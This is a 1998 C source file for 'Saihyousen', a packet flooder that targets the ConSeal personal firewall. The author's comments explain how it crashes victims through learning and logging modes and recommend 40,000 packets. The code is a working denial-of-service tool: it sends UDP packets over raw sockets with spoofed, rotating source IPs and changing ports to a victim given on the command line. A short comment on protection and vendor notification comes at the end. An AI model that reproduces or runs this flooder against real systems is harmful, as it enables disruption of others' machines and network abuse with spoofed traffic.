/* Saihyousen Attack (*Japanese* Ice Breaker), By Noc-Wage (M.C.S.R)
 * Base code from arnudp.c but HEAVILY modified. Originally written
 * sometime early April 1998, I'm a little fuzzy as to the date.
 *
 * I take no responsibility for the actions of any script kiddies who
 * think that running this against some one is a fun way to pass away
 * their useless lives.  I also in NO WAY claim to be good at
 * programming, so modify it all you want, just leave credit to me
 * and PLEASE send me a copy of your modified code.
 *
 * I chose ice breaker because the night before writing this program
 * I read through all of William Gibson's Neuromancer while cradling
 * an empty bottle of Canadian Club and sick with the flu.
 *
 * HOW IT WORKS:
 * The way this program kills the machine happens in 2 ways
 * #1 If Conseal is set for "learning" mode the flooding packets from
 * all the different IPs and ports will cause the program to continously

 * attempt to write more and more new rules.  This eventually uses up
 * all the resources and results in a freeze and eventually a reboot.
 * #2 If ConSeal is set to log attacks, once again because of the number

 * of packets the system resources are eaten up and the machine dies.
 *
 * I tested dx2/66 running RedHat 4.0 (12 megs of ram)
 * as the attacker and a Pentium 233 (64 megs of ram)
 * as the victim.  Using ConSeal The pentium 233 froze after about 5
 * seconds of attack. (This is on an ethernet, but I had done live
testing
 * over ppp connection (33.6/28.8) and it took only  few more seconds.
 * Because the packets are so small a 28.8 dial-up would not get lag at
 * all, 14.4 would get minor after about 20,000 packets.  So send as
many
 * as you want, generally 40,000 will kill anything.
 *
 * Shouts: My foolish friend who's addicted to ICQ: Essence
 *    #Snickers especially humble(horizon), colonwq, n`tropy, sheenie,
sygma!
 *         Howdy to fellow Miltonians Acid_Red (Mully and Tom)
 *     #hackers, `Lo SUidRoot, iCBM, drsmoke, EPiC, trix, modred, halt
 *         And all the rest!
 *     Don't we all miss TRON?
 *    Nullifier, my cousin (Hey Al H***)
 */



/* Should compile on all linux, not too sure about BSD, if you modify it
to make
 * it better in some way please mail it too me, I'd be interested in
seeing it. */

#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in_systm.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<errno.h>
#include<strings.h>
#include<netdb.h>
#include <stdlib.h>
#include<stdio.h>
#ifdef BROKEN_LIBC
#include <arpa/inet.h>
#else
#define u_char unsigned char
#define u_short unsigned short
#endif

struct sockaddr sa;

int conseal_main(int argc,char **argv)
{
int fd;
int x=1;
int hosti=192;
int hostii=168;
int hostiii=1;
int meep=0;
int fooport=1;
int numpack=0;
char funhost[15];
struct sockaddr_in *p;
struct hostent *he;
u_char gram[36]=
 {
 0x45, 0x00, 0x00, 0x26,
 0x12, 0x34, 0x00, 0x00,
 0xFF, 0x11, 0, 0,
 0, 0, 0, 0,
 0, 0, 0, 0,

 0, 0, 0, 0,
 0x00, 0x12, 0x00, 0x00,

 '3','1','3','3','7','8','9','0'
 };

if(argc!=3)
 {
 fprintf(stderr,"Saihyousen, by Noc-Wage\n");
 fprintf(stderr,"The faster your connection to the internet is (latencywise, not bandwidth)\n");
 fprintf(stderr,"and the lower the CPU speed of the victimwill\nincrease probability of success\n");
 fprintf(stderr,"usage: %s victim num_of_packets Ex: saihyousen127.0.0.1 40000\n",*argv);
 exit(1);
 };
if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
 {
 perror("requires RAW SOCKETS");
 exit(1);
 };

#ifdef IP_HDRINCL
if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
 {
 perror("setsockopt IP_HDRINCL");
 exit(1);
        };
#else
fprintf(stderr,"we don't have IP_HDRINCL :-(\n\n");
#endif

/* The stuff below is so that it's not fully sequential  i.e
   100.100.100.101, 100.100.100.102  */
for (numpack=0;numpack<=atoi(argv[2]);numpack++) {
 if (meep==0) { ++hosti; meep++; }
 if (hosti>254) hosti=1;
 if (meep==1) { ++hostii; meep++;}
 if (hostii>254) hostii=1;
 if (meep==2) { ++hostiii; meep=0;}
 if (hostiii>254) hostiii=1;

sprintf( funhost, "%i.%i.%i.%i",hosti,hostii,hostiii,hosti);
(he=gethostbyname(funhost));
bcopy(*(he->h_addr_list),(gram+12),4);

if((he=gethostbyname(argv[1]))==NULL)
 {
 fprintf(stderr,"can't resolve destination hostname\n");
 exit(1);
 };
bcopy(*(he->h_addr_list),(gram+16),4);
fooport++;
/* resets the port to 1 if it's nearing the end of possible values */
if (fooport>65530) {fooport=1;};
*(u_short*)(gram+20)=htons((u_short)fooport);
*(u_short*)(gram+22)=htons((u_short)fooport);

p=(struct sockaddr_in*)&sa;
p->sin_family=AF_INET;
bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));

if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct
sockaddr)))== -1)
 {
 perror("sendto");
 exit(1);
 };
/* printf("Packet # %i\n", numpack); */
/* Turn that on to see where you are.. it'll slow the attack though */
};
printf("Attack against %s finished", argv[1]);
putchar('\n');
return 1;
}


/* How to protect yourself?
 * Well it's fairly simple, disable learning and logging mode.
 * Signal9 has been made aware of this problem LONG before I decided
 * to release it, so people who actually paid for it and keep their copy

 * updated should have no problems.  Those of you out there who used
 * a crack or a key generator are probably the type that sit on IRC
 * warez channels all day. As we all know IRC is a very dangerous
 * place for warez pups so I guess you aren't as protected as you may
 * think.
 *
 * www.signal9.com you can download and upgrade the exsisting
 * copy that you own.
 * Don't come crying to me if your pirated copy of a rather inexpensive
 * piece of software blows up in your face.
 */

